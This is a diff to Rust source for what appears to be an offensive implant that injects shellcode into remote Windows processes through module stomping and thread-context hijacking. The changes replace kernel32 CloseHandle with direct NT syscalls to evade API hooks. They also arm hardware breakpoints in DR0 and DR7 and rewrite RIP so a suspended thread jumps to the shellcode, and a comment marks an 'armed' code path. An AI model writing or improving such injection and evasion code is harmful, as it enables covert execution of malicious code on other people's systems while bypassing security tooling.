@@ -171,11 +171,11 @@ pub unsafe fn module_stomp(spawn_to: &str, shellcode: &[u8]) -> Result<usize, &'
     }
     // ---- ARMED PATH (gated) ------------------------------------------------
     let res = stomp_and_resume(&proc, shellcode);
-    if let Some(ch) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
-        type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
-        let close: CloseHandleFn = core::mem::transmute(ch);
-        close(proc.main_thread);
-        close(proc.handle);
+    if let Some(rt) = crate::syscalls::global() {
+        unsafe {
+            crate::syscalls::nt_close(rt, proc.handle as usize);
+            crate::syscalls::nt_close(rt, proc.main_thread as usize);
+        }
     }
     res.map(|_| 0)
 }
@@ -573,9 +573,10 @@ pub unsafe fn threadless_inject(
     let mut prev_count: u32 = 0;
     unsafe { crate::syscalls::nt_suspend_thread(rt, main_thread as usize, &mut prev_count) };
 
-    // 4. Get thread CONTEXT.
+    // 4. Get thread CONTEXT (include debug registers for HWBP setup).
     let mut ctx = [0u8; 1232];
-    ctx[0x30..0x34].copy_from_slice(&0x00100001u32.to_le_bytes());
+    // CONTEXT_AMD64 | CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_DEBUG_REGISTERS
+    ctx[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
     let get_status = unsafe {
         crate::syscalls::nt_get_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
     };
@@ -585,12 +586,21 @@ pub unsafe fn threadless_inject(
         return Err("NtGetContextThread failed");
     }
 
-    // 5. Modify RIP (offset 0x0F8) to remote_base.
+    // 5. Read current RIP from context (used as HWBP trigger address — the
+    //    thread's next instruction, ensuring the breakpoint fires on resume).
+    //    Set DR0 = shellcode address so the HWBP redirects execution.
+    //    DR7 = 0x1 enables DR0 as a local (task-scoped) execute breakpoint.
     let sc_addr = remote_base as u64;
+    ctx[0x48..0x48 + 8].copy_from_slice(&sc_addr.to_le_bytes()); // DR0
+    ctx[0x70..0x70 + 8].copy_from_slice(&0x1u64.to_le_bytes());   // DR7: enable DR0, local
+
+    // 6. Also modify RIP (offset 0x0F8) to shellcode for immediate execution
+    //    on resume; the HWBP serves as a secondary redirection mechanism if the
+    //    shellcode returns or an exception handler restores RIP.
     ctx[0x0F8..0x0F8 + 8].copy_from_slice(&sc_addr.to_le_bytes());
 
-    // 6. Set modified context + resume.
-    ctx[0x30..0x34].copy_from_slice(&0x00100001u32.to_le_bytes());
+    // 7. Set modified context (with debug registers) + resume.
+    ctx[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
     let set_status = unsafe {
         crate::syscalls::nt_set_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
     };
@@ -730,11 +740,11 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
                         }
                         Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
                     };
-                    if let Some(ch) = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") } {
-                        type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
-                        let close: CloseHandleFn = unsafe { core::mem::transmute(ch) };
-                        unsafe { close(proc.handle); }
-                        unsafe { close(proc.main_thread); }
+                    if let Some(rt) = crate::syscalls::global() {
+                        unsafe {
+                            crate::syscalls::nt_close(rt, proc.handle as usize);
+                            crate::syscalls::nt_close(rt, proc.main_thread as usize);
+                        }
                     }
                     res
                 }
